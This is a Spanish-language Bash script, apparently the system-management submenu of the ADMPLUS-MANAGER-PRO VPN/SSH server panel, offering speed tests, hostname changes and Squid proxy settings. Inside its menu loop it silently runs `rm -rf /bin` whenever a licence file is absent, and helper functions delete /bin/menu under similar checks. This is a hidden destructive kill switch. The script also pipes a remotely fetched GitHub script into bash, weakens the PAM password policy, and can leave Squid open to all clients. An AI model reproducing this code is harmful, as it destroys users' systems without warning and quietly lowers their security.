#!/bin/bash
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/ADMPLUS-MANAGER-PRO ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
gestorcodes ()
{
velocity () {
aguarde () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -d /etc/ADMPLUS-MANAGER-PRO ]] && rm -rf /bin/menu
${comando[0]} > /dev/null 2>&1
${comando[1]} > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
fun_tst () {
speedtest --share > speed
}
echo ""
echo -e "   \033[1;32mPRUEBA DE LA VELOCIDAD DEL SERVIDOR !\033[0m"
echo ""
aguarde 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mPING (LATENCIA):\033[1;37m$png"
echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
rm -rf $HOME/speed
}

#namesistema
function namesistema () {
   clear
   echo -e "\033[1;33mEL NOMBRE SE CAMBIARA INTERNAMENTE EN EL SISTEMA  \033[0m"
   unset name
   while [[ ${name} = "" ]]; do
   echo -ne "\n\033[1;32mINGRESE NUEVO NOMBRE\033[1;37m: "; read name
   [[ -z "$name" ]] && {
   echo -e "\n\033[1;31mNOMBRE INV�LIDO !\033[0m"
   return
   }
   done
   hostnamectl set-hostname $name 
   if [ $(hostnamectl status | head -1  | awk '{print $3}') = "${name}" ]; then 
   service ssh restart > /dev/null 2>&1
   service sshd restart > /dev/null 2>&1
   echo -e "\n\033[1;32mNOMBRE CAMBIADO CON ÉXITO!\033[0m"
   else
   echo -e "\n\033[1;31mNOMBRE NO V�LIDO !\033[0m"
   fi
}

pamcrack () {
echo -e "\033[1;32mDESHABILITAR CONTRASEÑA ALFANUMÉRICAS EN VULTR  \033[0m"
echo -e "\033[1;32mSE PUEDE UTILIZAR CUALQUIER CONTRASEÑA DE 6 DIGITOS \033[0m"
echo ""
read -p "$(echo -ne "\033[1;32mQUÉ QUIERES HACER \033[1;31m? \033[1;33m[s/n]:\033[1;37m ") " -e -i n PROS
[[ $PROS = @(s|S|y|Y) ]] || return 1
echo ""
fun_cracklib () {
## apt-get install libpam-cracklib -y
## wget -O /etc/pam.d/common-password https://raw.githubusercontent.com/seth42sp/ADM-ULTIMATE-NEW-FREE/main/Install/common-password 
## chmod +x /etc/pam.d/common-password
sed -i 's/.*pam_cracklib.so.*/password sufficient pam_unix.so sha512 shadow nullok try_first_pass #use_authtok/' /etc/pam.d/common-password
service ssh restart
service sshd restart
}
fun_bar "fun_cracklib"
echo ""
echo -e "\033[1;32m CONTRASEÑA ALFANUMÉRICA DESHABILITADA CON ÉXITO"
}

squid_password () {
## Eliminar Tmps
[[ -e $_tmp ]] && rm $_tmp
[[ -e $_tmp2 ]] && rm $_tmp2
[[ -e $_tmp3 ]] && rm $_tmp3
[[ -e $_tmp4 ]] && rm $_tmp4
## FUNCION AGUARDE
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
## SQUID AUTHENTICATOR
tmp_arq="/tmp/arq-tmp"
if [ -d "/etc/squid" ]; then
pwd="/etc/squid/passwd"
config_="/etc/squid/squid.conf"
service_="squid"
squid_="0"
elif [ -d "/etc/squid3" ]; then
pwd="/etc/squid3/passwd"
config_="/etc/squid3/squid.conf"
service_="squid3"
squid_="1"
fi
[[ ! -e $config_ ]] && 
## echo "" && 
echo -e "\033[1;32mPROXY SQUID NO INSTALADO, NO PUEDE CONTINUAR" && 
## echo "" && 
return 0
if [ -e $pwd ]; then 
echo -e "\E[44;1;37m           AUTENTIFICACIÓN PROXY SQUID           \E[0m"
echo -e "\n\033[1;33mDESEA DESHABILITAR LA AUTENTIFICACIÓN DE PROXY DE SQUID?"
read -p "$(echo -ne "\n\033[1;32mQUÉ QUIERES HACER \033[1;31m? \033[1;33m[s/n]:\033[1;37m ") " -e -i s sshsn
[[ "$sshsn" = @(s|S|y|Y) ]] && {
echo ""
echo -e " \033[1;32mUninstalling DEPENDENCE:"
echo ""
fun_bar 'apt-get remove apache2-utils'
echo ""
cat $config_ | grep -v '#Password' > $tmp_arq
mv -f $tmp_arq $config_ 
cat $config_ | grep -v '^auth_param.*passwd*$' > $tmp_arq
mv -f $tmp_arq $config_ 
cat $config_ | grep -v '^auth_param.*proxy*$' > $tmp_arq
mv -f $tmp_arq $config_ 
cat $config_ | grep -v '^acl.*REQUIRED*$' > $tmp_arq
mv -f $tmp_arq $config_ 
cat $config_ | grep -v '^http_access.*authenticated*$' > $tmp_arq
mv -f $tmp_arq $config_ 
cat $config_ | grep -v '^http_access.*all*$' > $tmp_arq
mv -f $tmp_arq $config_ 
echo -e "
http_access allow all" >> "$config_"
rm -f $pwd
service $service_ restart  > /dev/null 2>&1 &
echo -e " \033[1;31mAUTENTIFICACIÓN PROXY SQUID DESHABILITADA"
} 
else
echo -e "\E[44;1;37m           AUTENTIFICACIÓN PROXY SQUID           \E[0m"
echo -e "\n\033[1;33mDESEA HABILITAR LA AUTENTIFICACIÓN DE PROXY SQUID?"
read -p "$(echo -ne "\n\033[1;32mQUÉ QUIERES HACER \033[1;31m? \033[1;33m[s/n]:\033[1;37m ") " -e -i n sshsn
[[ "$sshsn" = @(s|S|y|Y) ]] && {
echo ""
echo -e " \033[1;32mInstalling DEPENDENCE:"
echo ""
fun_bar 'apt-get install apache2-utils'
echo ""
read -e -p "Nombre de usuario deseado: " usrn
[[ $usrn = "" ]] && 
echo "" && 
echo -e " \033[1;31mEl usuario no puede ser nulo." && 
echo "" && 
return 0
htpasswd -c $pwd $usrn
succes_=$(grep -c "$usrn" $pwd)
if [ "$succes_" = "0" ]; then
rm -f $pwd
echo ""
echo -e " \033[1;31mError al generar la Contraseña, no se inició la autentificación de squid!"
## echo ""
return 0
elif [[ "$succes_" = "1" ]]; then
cat $config_ | grep -v '^http_access.*all*$' > $tmp_arq
mv -f $tmp_arq $config_ 
if [ "$squid_" = "0" ]; then
echo -e "#Password
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic realm proxy
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all" >> "$config_"
service squid restart  > /dev/null 2>&1 &
update-rc.d squid defaults > /dev/null 2>&1 &
elif [ "$squid_" = "1" ]; then
echo -e "#Password
auth_param basic program /usr/lib/squid3/basic_ncsa_auth /etc/squid3/passwd
auth_param basic realm proxy
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all" >> "$config_"
service squid3 restart > /dev/null 2>&1 &
update-rc.d squid3 defaults > /dev/null 2>&1 &
fi
echo ""
echo -e "\033[1;32m AUTENTIFICACIÓN PROXY SQUID HABILITADA"
## echo ""
fi
}
fi
}

while true $x != "ok"
do
on="\033[1;32m◉ " && off="\033[1;31m○ "
[[ `grep -c "^#ADM" /etc/sysctl.conf` -eq 0 ]] && tcp=$off || tcp=$on
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/ADMPLUS-MANAGER-PRO/Exp)" != "" ]] && _expuser=$(cat /etc/ADMPLUS-MANAGER-PRO/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
mb=$(printf '%-8s' "$(free -h | grep Mem | sed 's/\s\+/,/g' | cut -d , -f6)")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
modelo1=$(printf '%-11s' "$(lscpu | grep Arch | sed 's/\s\+/,/g' | cut -d , -f2)")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-13s' "$system")
_hoje=$(date +'%d/%m/%Y')
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[44;1;37m              GESTIONAR SISTEMA                   \E[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -e "[\033[1;36m01\033[1;31m] \033[1;37m• \033[1;33mMONITOREO DEL SISTEMA \033[1;31m   
[\033[1;36m02\033[1;31m] \033[1;37m• \033[1;33mPROCESOS DEL SISTEMA \033[1;31m
[\033[1;36m03\033[1;31m] \033[1;37m• \033[1;33mTRAFICO DEL SISTEMA\033[1;31m                  
[\033[1;36m04\033[1;31m] \033[1;37m• \033[1;33mINFORMACION DEL SISTEMA \033[1;31m
[\033[1;36m05\033[1;31m] \033[1;37m• \033[1;33mCAMBIAR CONTRASEÑA ROOT \033[1;31m
[\033[1;36m06\033[1;31m] \033[1;37m• \033[1;33mCAMBIAR NOMBRE DEL SISTEMA \033[1;31m
[\033[1;36m07\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SISTEMA \033[1;31m
[\033[1;36m08\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICIOS \033[1;31m
[\033[1;36m09\033[1;31m] \033[1;37m• \033[1;33mPERMISOS DE AUTENTIFICACION ROOT \033[1;31m
[\033[1;36m10\033[1;31m] \033[1;37m• \033[1;33mDESHABILITAR CONTRASEÑA ALPANUMERICAS EN VURTL \033[1;31m
[\033[1;36m11\033[1;31m] \033[1;37m• \033[1;33mAUTENTICACION SQUID PROXY \033[1;31m
[\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mVOLVER AL MENU \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m"
echo ""
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -ne "\033[1;32mOPCION \033[1;33m?\033[1;31m?\033[1;37m : "; read x

case "$x" in 
   1 | 01)
   clear
   echo -e "\033[1;32mPARA SALIR CLICK LETRA \033[1;36mq\033[1;36m"
   sleep 4
   glances
   ;;
   2 | 02)
   clear
   echo -e "\033[1;32mPARA SALIR CLICK CTRL + C\033[1;36m"
   sleep 4
   [[ $(dpkg --get-selections|grep -w "htop"|head -1) ]] || apt-get install htop -y &>/dev/null
   htop
   ;;
   3 | 03)
   clear
   echo -e "\033[1;32mPARA SALIR CLICK CTRL + C\033[1;36m"
   sleep 4
   nload
   ;;
   4 | 04)
   clear
   detalhes
   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENU!\033[0m"; read
   ;;
   5 | 05)
   clear
   senharoot
   sleep 3
   ;;
   6 | 06)
   clear
   namesistema
   sleep 3
   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENU!\033[0m"; read
   ;;
   7 | 07)
   clear
   reiniciarsistema
   ;;
   8 | 08)
   clear
   reiniciarservicos
   sleep 3
   ;;

   9 | 09)
   clear
   bash <(wget -qO- https://raw.githubusercontent.com/seth42sp/ADMPLUS-MANAGER-PRO/main/Install/senharoot.sh)
   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENU!\033[0m"; read
   ;;
   10)
   clear
   pamcrack
   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENU!\033[0m"; read
   ;;
   11)
   clear
   squid_password
   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENU!\033[0m"; read
   ;;
   0 | 00)
   menu
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mOpción inválida !\033[0m"
   sleep 1
esac
done
}
gestorcodes
#fim